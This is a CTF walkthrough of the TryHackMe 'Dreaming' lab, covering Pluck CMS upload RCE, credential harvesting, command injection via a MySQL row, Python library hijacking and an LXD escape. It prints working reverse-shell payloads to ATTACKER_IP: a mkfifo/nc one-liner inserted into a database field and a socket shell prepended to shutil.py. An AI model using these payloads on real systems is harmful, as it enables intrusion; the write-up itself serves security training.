---
title: "TryHackMe: Dreaming"
description: "A walkthrough of the Dreaming room on TryHackMe, exploiting Pluck CMS, command injection via MySQL, and Python library hijacking for privilege escalation."
date: 2025-12-19
categories: [TryHackMe]
tags: [ctf, tryhackme, easy, pluck-cms, command-injection, privilege-escalation, python-library-hijacking, cve-2020-29607]
image:
  path: /assets/img/tryhackme/2025/dreaming/cover.png
  alt: TryHackMe Dreaming Room
---

## Overview

| Property | Value |
|----------|-------|
| Room | [Dreaming](https://tryhackme.com/room/dreaming) |
| Difficulty | Easy |
| OS | Linux (Ubuntu) |
| Attack Chain | `www-data → lucien → death → morpheus → root` |

Dreaming was a room featuring multiple lateral movements through different users. We started by discovering a Pluck CMS installation through directory enumeration and exploited a file upload vulnerability to gain initial access. From there, we found hardcoded credentials in a Python script to pivot to the first user, then leveraged command injection in a MySQL backup script to move to the next. Finally, we exploited a Python library hijacking vulnerability via a writable module and cron job to reach a user with full sudo privileges, giving us root access.

### Tools Used

| Phase | Tool | Purpose |
|-------|------|---------|
| Recon | nmap | Port scanning and service enumeration |
| Enum | gobuster/ffuf | Directory brute-forcing |
| Exploit | searchsploit | Finding Pluck CMS exploit |
| Shell | netcat | Reverse shell listener |
| Privesc | pspy | Process monitoring for cron jobs |

---

## Reconnaissance

We begin with a standard nmap scan to identify open ports and running services.

```console
$ nmap -sC -sV -Pn $TARGET
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
|   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
|_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports are open: SSH on port 22 and HTTP on port 80. The web server shows the default Apache page, indicating we need to dig deeper for hidden content.

![Apache Default Page](/tryhackme/2025/dreaming/apache.png){: .normal }

---

## Enumeration

### Directory Discovery

Since the Apache default page is displayed, there must be hidden directories. Let's enumerate with gobuster.

```console
$ gobuster dir -u http://$TARGET/ -w /usr/share/wordlists/dirb/common.txt -t 50
===============================================================
Gobuster v3.6
===============================================================
[+] Url:           http://10.81.146.130/
[+] Threads:       50
[+] Wordlist:      /usr/share/wordlists/dirb/common.txt
===============================================================
/app                  (Status: 301) [--> http://10.81.146.130/app/]
===============================================================
```

We discover an `/app` directory. Browsing to it reveals a directory listing.

![App Directory](/tryhackme/2025/dreaming/app-directory.png){: .normal }

### Pluck CMS Discovery

Inside `/app`, we find `pluck-4.7.13` - a lightweight content management system. Navigating to the CMS reveals version information in the footer.

> **Key Finding:** Pluck CMS version 4.7.13 has a known file upload vulnerability ([CVE-2020-29607](https://nvd.nist.gov/vuln/detail/CVE-2020-29607)) that allows authenticated users to upload PHP files with alternate extensions.
{: .prompt-info }

The admin login page is at `/app/pluck-4.7.13/login.php`.

![Pluck Login](/tryhackme/2025/dreaming/pluck-login.png){: .normal }

### Testing Default Credentials

Before attempting exploitation, we try common default passwords. The password `password` grants admin access.

![Pluck Admin Panel](/tryhackme/2025/dreaming/pluck-admin.png){: .normal }

---

## Initial Access

### CVE-2020-29607: Pluck CMS File Upload RCE

With admin access, we can exploit the file upload vulnerability to achieve remote code execution.

**Why This Works:**

Pluck CMS validates file uploads by checking extensions against a blacklist. However, it fails to block `.phar` files, which Apache executes as PHP when configured with the PHP handler.

```console
$ searchsploit pluck 4.7.13
-----------------------------------------------------------------
 Exploit Title                                   |  Path
-----------------------------------------------------------------
Pluck CMS 4.7.13 - File Upload Remote Code       | php/webapps/49909.py
  Execution (Authenticated)
-----------------------------------------------------------------

$ searchsploit -m php/webapps/49909.py
```

![Exploit Search](/tryhackme/2025/dreaming/exploit.png){: .normal }

### Running the Exploit

```bash
# Start a listener
nc -lvnp 4444

# Execute the exploit (in another terminal)
python3 49909.py $TARGET 80 password /app/pluck-4.7.13
```

The exploit uploads a webshell accessible at `/app/pluck-4.7.13/files/shell.phar`.

![Webshell Access](/tryhackme/2025/dreaming/webshell.png){: .normal }

```
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.81.146.130] 46366
Linux dreaming 5.4.0-155-generic #172-Ubuntu SMP Fri Jul 7 16:10:02 UTC 2023 x86_64
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Shell Upgrade

For a more stable shell, upgrade using Python:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z, then:
stty raw -echo; fg
```

---

## Lateral Movement

### www-data → lucien

#### User Enumeration

First, let's identify users on the system:

```console
$ cat /etc/passwd | grep -v nologin | grep -v false
root:x:0:0:root:/root:/bin/bash
lucien:x:1000:1000:lucien:/home/lucien:/bin/bash
death:x:1001:1001::/home/death:/bin/bash
morpheus:x:1002:1002::/home/morpheus:/bin/bash
```

We have three target users: `lucien`, `death`, and `morpheus`.

#### Credential Discovery

Enumerating the system, we find interesting files in `/opt`:

```console
$ ls -la /opt/
total 16
drwxr-xr-x  2 root   root   4096 Aug 15 12:45 .
drwxr-xr-x 20 root   root   4096 Jul 28 22:35 ..
-rwxrw-r--  1 death  death  1574 Aug 15 12:45 getDreams.py
-rwxr-xr-x  1 lucien lucien  483 Aug  7 23:36 test.py
```

Reading `test.py` reveals hardcoded credentials:

```console
$ cat /opt/test.py
import requests

#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#@1999!"

data = {
        "cont1":password,
        "bogus":"",
        "submit":"Log+in"
        }

response = requests.post(url, data=data)

if response.status_code == 200:
    print("login successful")
else:
    print("login failed")
```

> **Security Anti-Pattern:** Hardcoded credentials in plaintext files. Always use environment variables or secure credential stores.
{: .prompt-warning }

#### SSH Access

```console
$ ssh lucien@$TARGET
                                  {} {}
                            !  !  II II  !  !
                         !  I__I__II II__I__I  !
                         I_/|--|--|| ||--|--|\_I
        .-'"'-.       ! /|_/|  |  || ||  |  |\_|\ !       .-'"'-.
       /===    \      I//|  |  |  || ||  |  |  |\\I      /===    \
       \==     /   ! /|/ |  |  |  || ||  |  |  | \|\ !   \==     /
        \__  _/    I//|  |  |  |  || ||  |  |  |  |\\I    \__  _/
         _} {_  ! /|/ |  |  |  |  || ||  |  |  |  | \|\ !  _} {_
        {_____} I//|  |  |  |  |  || ||  |  |  |  |  |\\I {_____}
   !  !  |=  |=/|/ |  |  |  |  |  || ||  |  |  |  |  | \|\=|-  |  !  !
  _I__I__|=  ||/|  |  |  |  |  |  || ||  |  |  |  |  |  |\||   |__I__I_
  -|--|--|-  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |--|--|-
  _|__|__|   ||_|__|__|__|__|__|__|| ||__|__|__|__|__|__|_||-  |__|__|_
  -|--|--|   ||-|--|--|--|--|--|--|| ||--|--|--|--|--|--|-||   |--|--|-
   |  |  |=  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |  |  |
   |  |  |-  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |  |  |
   |  |  |=  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||-  |  |  |
  _|__|__|   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |__|__|_
  -|--|--|=  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |--|--|-
  _|__|__|   ||_|__|__|__|__|__|__|| ||__|__|__|__|__|__|_||-  |__|__|_
  -|--|--|=  ||-|--|--|--|--|--|--|| ||--|--|--|--|--|--|-||=  |--|--|-
  jgs |  |-  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||-  |  |  |
 ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~~~~~~~~~~~

W e l c o m e, s t r a n g e r . . .

lucien@$TARGET's password:
Last login: Fri Nov 17 23:25:31 2023 from 10.9.2.12
lucien@dreaming:~$ id
uid=1000(lucien) gid=1000(lucien) groups=1000(lucien),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lxd)
```

We're now `lucien`. Grab the first flag:

```bash
cat ~/lucien_flag.txt
```

> **Note:** Lucien is a member of the `lxd` group, which provides an alternative privilege escalation path (covered at the end).
{: .prompt-tip }

### lucien → death

#### Sudo Enumeration

```console
lucien@dreaming:~$ sudo -l
User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

Lucien can run `getDreams.py` as the `death` user. Let's analyze this script.

#### Analyzing getDreams.py

We can't read the original file in death's home, but there's a readable copy in `/opt`:

```console
$ cat /opt/getDreams.py
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

def getDreams():
    try:
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )
        cursor = connection.cursor()
        query = "SELECT dreamer, dream FROM dreams;"
        cursor.execute(query)
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)
    except mysql.connector.Error as error:
        print(f"Error: {error}")
    finally:
        cursor.close()
        connection.close()

getDreams()
```

> **Vulnerability: Command Injection via subprocess**
>
> The script uses `subprocess.check_output()` with `shell=True` and directly interpolates database values into the command string. If we control the `dream` column, we can inject arbitrary commands using command substitution `$()`.
>
> **Vulnerable Pattern:**
> ```python
> command = f"echo {dreamer} + {dream}"
> subprocess.check_output(command, text=True, shell=True)
> ```
>
> **Secure Alternative:**
> ```python
> subprocess.check_output(["echo", dreamer, "+", dream])  # No shell=True
> ```
{: .prompt-danger }

#### MySQL Credentials from Bash History

Checking lucien's bash history reveals MySQL credentials:

```console
lucien@dreaming:~$ cat ~/.bash_history
mysql -u lucien -plucien42LMFAO123!@#
```

#### Injecting a Reverse Shell

Connect to MySQL and inject our payload:

```console
lucien@dreaming:~$ mysql -u lucien -p'lucien42LMFAO123!@#'
mysql> use library;
Database changed

mysql> show tables;
+-------------------+
| Tables_in_library |
+-------------------+
| dreams            |
+-------------------+

mysql> SELECT * FROM dreams;
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
+---------+------------------------------------+

mysql> INSERT INTO dreams (dreamer, dream) VALUES ("Nightmare", "$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 5555 >/tmp/f)");
Query OK, 1 row affected (0.01 sec)
```

Start a listener and trigger the script:

```bash
# Terminal 1
nc -lvnp 5555

# Terminal 2 (as lucien)
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

We receive a shell as `death`:

```
listening on [any] 5555 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.81.146.130] 52134
$ id
uid=1001(death) gid=1001(death) groups=1001(death)
```

Grab the second flag:

```bash
cat ~/death_flag.txt
```

---

## Privilege Escalation

### death → morpheus

#### Finding Writable Files

```console
$ find / -type f -writable 2>/dev/null | grep -v proc
/usr/lib/python3.8/shutil.py
```

The Python standard library file `shutil.py` is world-writable. This is a critical misconfiguration.

#### Process Monitoring

Using `pspy64`, we discover a cron job running as `morpheus` (UID=1002):

```console
$ ./pspy64
...
CMD: UID=1002  PID=5981   | /usr/bin/python3.8 /home/morpheus/restore.py
```

Let's check what `restore.py` does:

```console
$ cat /home/morpheus/restore.py
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

The script imports `shutil`! If we modify `/usr/lib/python3.8/shutil.py`, our code executes when the cron runs as morpheus.

#### Library Hijacking

Add a reverse shell to the beginning of `shutil.py`:

```bash
# Create payload
cat > /tmp/payload.py << 'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",6666))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
EOF

# Prepend to shutil.py
cat /tmp/payload.py /usr/lib/python3.8/shutil.py > /tmp/shutil_new.py
cp /tmp/shutil_new.py /usr/lib/python3.8/shutil.py
```

Start a listener and wait for the cron job:

```bash
nc -lvnp 6666
```

Within a minute, we get a shell as `morpheus`:

```
listening on [any] 6666 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.81.146.130] 48922
morpheus@dreaming:~$ id
uid=1002(morpheus) gid=1002(morpheus) groups=1002(morpheus),1003(saviors)
```

Grab the third flag:

```bash
cat ~/morpheus_flag.txt
```

### morpheus → root

```console
morpheus@dreaming:~$ sudo -l
User morpheus may run the following commands on dreaming:
    (ALL) NOPASSWD: ALL
```

Morpheus has unrestricted sudo access:

```console
morpheus@dreaming:~$ sudo su
root@dreaming:/home/morpheus# whoami
root
root@dreaming:/home/morpheus# id
uid=0(root) gid=0(root) groups=0(root)
```

Grab the final flag:

```bash
cat /root/root_flag.txt
```

---

## Alternative Path: LXD Privilege Escalation

Remember that `lucien` is a member of the `lxd` group. This provides an alternative (unintended) path to root.

```console
lucien@dreaming:~$ id
uid=1000(lucien) gid=1000(lucien) groups=1000(lucien),...,117(lxd)
```

### Exploitation Steps

1. Download Alpine Linux image on attacker machine:
```bash
# On attacker
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine
```

2. Transfer `alpine-v*.tar.gz` to target and import:
```bash
# On target as lucien
lxc image import ./alpine-v3.18-x86_64.tar.gz --alias myimage
```

3. Create privileged container with host filesystem mounted:
```bash
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

4. Access host root filesystem:
```console
~ # cd /mnt/root
/mnt/root # ls
bin  boot  dev  etc  home  kingdom_backup  lib  ...  root  ...
/mnt/root # cd root
/mnt/root/root # cat root_flag.txt
```

> **Why This Works:** LXD allows members to create privileged containers that run as root. By mounting the host filesystem, we can read/write any file on the host as root.
{: .prompt-info }

---

## Key Takeaways

### Vulnerabilities Exploited

| Vulnerability | Impact | Mitigation |
|--------------|--------|------------|
| Default CMS credentials | Initial admin access | Change default passwords |
| CVE-2020-29607 (File Upload) | Remote code execution | Update CMS, restrict upload extensions |
| Hardcoded credentials | Lateral movement | Use secrets management |
| Command injection (shell=True) | Privilege escalation | Sanitize inputs, avoid shell=True |
| World-writable system files | Library hijacking | Proper file permissions |
| LXD group membership | Container escape to root | Limit group membership |
| Excessive sudo privileges | Root access | Principle of least privilege |

### Security Anti-Patterns Observed

1. **Hardcoded passwords** in `/opt/test.py`
2. **Credentials in bash history** - MySQL password exposed
3. **Unsafe subprocess usage** - `shell=True` with user input
4. **World-writable system libraries** - `/usr/lib/python3.8/shutil.py`
5. **Overprivileged groups** - LXD membership allows root escape
6. **Unrestricted sudo** - `(ALL) NOPASSWD: ALL`

### Skills Practiced

- CMS vulnerability research and exploitation
- Database enumeration and command injection
- Process monitoring with pspy
- Python library hijacking via cron jobs
- Container escape via LXD
- Credential harvesting from history and config files

---

## References

- [CVE-2020-29607 - Pluck CMS File Upload RCE](https://nvd.nist.gov/vuln/detail/CVE-2020-29607)
- [Exploit-DB: Pluck 4.7.13 RCE](https://www.exploit-db.com/exploits/49909)
- [HackTricks: LXD Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
- [GTFOBins](https://gtfobins.github.io/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
